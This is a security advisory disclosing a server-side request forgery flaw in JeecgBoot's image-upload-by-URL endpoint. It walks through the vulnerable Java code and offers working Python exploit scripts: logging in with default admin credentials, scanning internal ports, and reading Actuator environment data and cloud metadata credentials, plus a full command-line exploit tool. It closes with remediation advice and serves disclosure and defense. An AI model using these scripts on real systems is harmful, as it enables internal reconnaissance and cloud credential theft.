# JeecgBoot Server-Side Request Forgery (SSRF)

## Vulnerability Description

JeecgBoot is an open-source enterprise low-code platform built on Spring Boot. The `uploadImgByHttp` endpoint in its file management module accepts an arbitrary user-supplied URL, fetches the content from that URL server-side, and saves it as a file. The endpoint performs no security validation on the target URL — no allowlist, no private IP filtering, no protocol restriction — allowing an attacker to leverage it for Server-Side Request Forgery (SSRF) attacks.

- **Vulnerability Type**: Server-Side Request Forgery (CWE-918)
- **Severity**: HIGH
- **CVSS 3.1 Score**: 8.6
- **Affected Version**: JeecgBoot ≤ 3.9.1
- **Vulnerable Endpoint**: `POST /sys/common/uploadImgByHttp`
- **Authentication Required**: Yes — valid JWT token required
- **Attack Complexity**: Low

## Vulnerability Analysis

### Data Flow

```
User-supplied fileUrl parameter
    │
    ▼
CommonController.uploadImgByHttp()
    │  Reads fileUrl directly from JSON request body
    ▼
HttpFileToMultipartFileUtil.httpFileToMultipartFile(fileUrl, filename)
    │  Passes user input through without any validation
    ▼
FileDownloadUtils.download2DiskFromNet(fileUrl, storePath)
    │
    ▼
new URL(fileUrl).openConnection()   ← Sink: unchecked URL request
    │
    ▼
Server fetches the target URL and saves the response as a file
```

### Vulnerable Code

**File**: `jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/CommonController.java`

The controller reads `fileUrl` from the request body and passes it directly to the download utility with no URL safety checks:

```java
@PostMapping("/uploadImgByHttp")
public Result<String> uploadImgByHtttppp(@RequestBody JSONObject jsonObject, HttpServletRequest request){
    String fileUrl = oConvertUtils.getString(jsonObject.get("fileUrl"));
    String filename = oConvertUtils.getString(jsonObject.get("filename"));
    String bizPath = oConvertUtils.getString(jsonObject.get("bizPath"));
    try {
        // fileUrl is fully attacker-controlled — no URL safety validation
        MultipartFile file = HttpFileToMultipartFileUtil.httpFileToMultipartFile(fileUrl, filename);
        SsrfFileTypeFilter.checkUploadFileType(file, bizPath);  // only checks file extension, not the URL target
        // ...
        savePath = this.uploadLocal(file, bizPath);
        return Result.OK(savePath);
    }
}
```

**File**: `jeecg-boot-base-core/src/main/java/org/jeecg/common/util/HttpFileToMultipartFileUtil.java`

The underlying utility opens the URL connection directly with no protocol or address restrictions:

```java
private static byte[] downloadImageData(String fileUrl) throws IOException {
    URL url = new URL(fileUrl);                                    // no protocol restriction
    HttpURLConnection connection = (HttpURLConnection) url.openConnection();  // no target address restriction
    connection.setRequestMethod("GET");
    connection.setConnectTimeout(5000);
    connection.setReadTimeout(10000);
    // ...
    int responseCode = connection.getResponseCode();
    if (responseCode != HttpURLConnection.HTTP_OK) {
        throw new IOException("HTTP request failed, response code: " + responseCode);
    }
    // reads and returns the response body
}
```

**Missing Controls Summary**:

| Control | Status |
|---------|--------|
| URL allowlist | ❌ Missing |
| Private IP filtering | ❌ Missing |
| Protocol restriction | ❌ Missing (HTTP/HTTPS only by class, not enforced) |
| DNS rebinding protection | ❌ Missing |
| Redirect restriction | ❌ Missing |
| Access logging | ❌ Missing |

## Proof of Concept

### Environment

- Target: JeecgBoot 3.9.1
- Base URL: `http://localhost:8080/jeecg-boot/`
- Test credentials: admin / 123456

### Step 1: Obtain JWT Token

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:8080/jeecg-boot"

resp = requests.post(
    f"{BASE_URL}/sys/login",
    json={"username": "admin", "password": "123456"},
    timeout=10
)
data = resp.json()
print(f"status : {resp.status_code}")
print(f"success: {data.get('success')}")
print(f"token  : {data['result']['token']}")
```

Response:

```
status : 200
success: True
token  : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIi...
```

### Step 2: Probe Internal HTTP Service

Force the server to fetch `127.0.0.1:8080`, confirming SSRF reachability:

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:8080/jeecg-boot"

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

token = login()

resp = requests.post(
    f"{BASE_URL}/sys/common/uploadImgByHttp",
    json={"fileUrl": "http://127.0.0.1:8080/jeecg-boot/", "filename": "ssrf_probe.jpg", "bizPath": "test"},
    headers={"X-Access-Token": token},
    timeout=15
)
print(f"status : {resp.status_code}")
print(f"body   : {resp.text}")
```

`success: true` confirms the server issued the request and saved the response as a file:

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260417155158366.png)

### Step 3: Internal Port Scan

Different error messages reveal whether a port is open or closed, enabling blind port scanning:

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:8080/jeecg-boot"

PORTS = [6379, 3306, 22, 80, 443, 9200, 8888]

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

token = login()

print(f"{'PORT':<8} {'STATUS':<10} MESSAGE")
print("-" * 70)
for port in PORTS:
    target = f"http://127.0.0.1:{port}/"
    try:
        resp = requests.post(
            f"{BASE_URL}/sys/common/uploadImgByHttp",
            json={"fileUrl": target, "filename": "scan.jpg", "bizPath": "scan"},
            headers={"X-Access-Token": token},
            timeout=12
        )
        r = resp.json()
        msg = r.get("message", "")

        if r.get("success"):
            status = "OPEN(200)"
        elif "Connection refused" in msg:
            status = "CLOSED"
        elif "Unexpected end" in msg or "HTTP request failed" in msg or "end of file" in msg.lower():
            status = "OPEN"
        elif "timed out" in msg.lower() or "timeout" in msg.lower():
            status = "FILTERED"
        else:
            status = "UNKNOWN"

        print(f"{port:<8} {status:<10} {msg[:60]}")
    except Exception as e:
        print(f"{port:<8} {'ERROR':<10} {str(e)[:60]}")
```

Results — Redis (6379) and SSH (22) confirmed open, matching the actual environment:

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260417155236093.png)

### Step 4: Read Internal HTTP Response Content

After the server fetches the target URL it saves the response body as a file. Attackers can then retrieve that file via the view endpoint to read the content. Unauthenticated internal services (e.g. Spring Actuator, internal APIs) leak sensitive data directly. On cloud instances, `169.254.169.254` yields IAM credentials with no authentication:

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:8080/jeecg-boot"

def login():
    r = requests.post(f"{BASE_URL}/sys/login", json={"username":"admin","password":"123456"}, timeout=10)
    return r.json()["result"]["token"]

token = login()

targets = [
    ("http://127.0.0.1:8080/jeecg-boot/actuator",     "actuator.jpg",     "Spring Actuator"),
    ("http://127.0.0.1:8080/jeecg-boot/actuator/env", "actuator_env.jpg", "Actuator /env (environment variables)"),
    ("http://169.254.169.254/latest/meta-data/",       "meta.jpg",         "AWS instance metadata (cloud environments)"),
]

for url, filename, desc in targets:
    print(f"\n[*] Target : {desc}")
    print(f"    URL    : {url}")

    resp = requests.post(
        f"{BASE_URL}/sys/common/uploadImgByHttp",
        json={"fileUrl": url, "filename": filename, "bizPath": "ssrf_read"},
        headers={"X-Access-Token": token},
        timeout=15
    )
    r = resp.json()
    print(f"    Result : success={r.get('success')}  message={r.get('message','')}")

    # If the file was saved, fetch and display its content
    if r.get("success"):
        saved_path = r.get("message", "")
        file_url = f"http://localhost:8080/jeecg-boot/sys/common/view/{saved_path}"
        content_resp = requests.get(file_url, headers={"X-Access-Token": token}, timeout=10)
        print(f"    Content: {content_resp.text[:300]}")
```

Local test results (Actuator returns 401, which itself proves the outbound request was made; on cloud, `169.254.169.254` returns IAM tokens with no auth):

![](https://gitee.com/nn0nkey/picture/raw/master/img/20260417155302000.png)

## Full PoC Script

```python
#!/usr/bin/env python3
"""
JeecgBoot SSRF PoC
Endpoint: POST /sys/common/uploadImgByHttp
"""
import requests
import argparse


def login(base_url, username, password):
    resp = requests.post(
        f"{base_url}/sys/login",
        json={"username": username, "password": password}
    )
    data = resp.json()
    if data.get("success"):
        print(f"[+] Logged in as: {username}")
        return data["result"]["token"]
    print(f"[-] Login failed: {data.get('message')}")
    return None


def exploit_ssrf(base_url, token, target_url, filename="ssrf.jpg"):
    print(f"\n{'='*50}")
    print(f"[*] SSRF target: {target_url}")
    print(f"{'='*50}")

    resp = requests.post(
        f"{base_url}/sys/common/uploadImgByHttp",
        json={"fileUrl": target_url, "filename": filename, "bizPath": "ssrf"},
        headers={"X-Access-Token": token}
    )
    result = resp.json()

    if result.get("success"):
        print(f"[+] SSRF successful!")
        print(f"[+] Server fetched: {target_url}")
        print(f"[+] Response saved at: {result['message']}")
        return True
    else:
        print(f"[-] SSRF failed: {result.get('message')}")
        return False


def port_scan(base_url, token, host, ports):
    print(f"\n{'='*50}")
    print(f"[*] Port scan: {host}")
    print(f"{'='*50}")

    for port in ports:
        target = f"http://{host}:{port}/"
        resp = requests.post(
            f"{base_url}/sys/common/uploadImgByHttp",
            json={"fileUrl": target, "filename": "scan.jpg", "bizPath": "scan"},
            headers={"X-Access-Token": token},
            timeout=10
        )
        result = resp.json()
        msg = result.get("message", "")
        if result.get("success"):
            print(f"[+] {host}:{port} - OPEN (HTTP 200)")
        elif "HTTP request failed" in msg or "Unexpected end" in msg:
            print(f"[*] {host}:{port} - OPEN (non-HTTP service or non-200 response)")
        elif "Connection refused" in msg:
            print(f"[-] {host}:{port} - CLOSED")
        else:
            print(f"[?] {host}:{port} - {msg[:60]}")


def main():
    parser = argparse.ArgumentParser(description="JeecgBoot SSRF PoC")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://target:8080/jeecg-boot)")
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", default="123456")
    parser.add_argument("--target", help="SSRF target URL")
    parser.add_argument("--scan",   help="Host IP to port-scan via SSRF")
    parser.add_argument("--ports",  default="22,80,443,3306,6379,8080,8443,9200", help="Comma-separated port list")

    args = parser.parse_args()
    base_url = args.url.rstrip("/")

    token = login(base_url, args.username, args.password)
    if not token:
        return

    if args.target:
        exploit_ssrf(base_url, token, args.target)

    if args.scan:
        ports = [int(p) for p in args.ports.split(",")]
        port_scan(base_url, token, args.scan, ports)

    if not args.target and not args.scan:
        print("\n[*] Default test: probing local service")
        exploit_ssrf(base_url, token, "http://127.0.0.1:8080/")


if __name__ == "__main__":
    main()
```

**Usage:**

```bash
# Basic test
python ssrf_poc.py -u http://target:8080/jeecg-boot

# Probe a specific internal URL
python ssrf_poc.py -u http://target:8080/jeecg-boot --target http://169.254.169.254/latest/meta-data/

# Port scan an internal host
python ssrf_poc.py -u http://target:8080/jeecg-boot --scan 10.0.0.1 --ports 22,80,3306,6379,8080
```

## Remediation

1. **URL allowlist**: Only permit fetching from a pre-configured list of trusted external domains.
2. **Block private IP ranges**: Reject requests targeting `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16` and `::1`.
3. **Post-DNS-resolution check**: Resolve the hostname to an IP address first, then validate that the resolved IP does not fall within a blocked range (mitigates DNS rebinding).
4. **Restrict protocols**: Allow HTTPS only; reject plain HTTP and non-HTTP schemes.
5. **Disable or limit redirects**: If redirects must be followed, apply the same URL validation to each redirect target.
6. **Short timeouts**: Set aggressive connection and read timeouts to reduce the usefulness of the endpoint as a port scanner.

## Disclaimer

This report is intended solely for security research and authorized penetration testing. Unauthorized use of this information against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for any misuse.
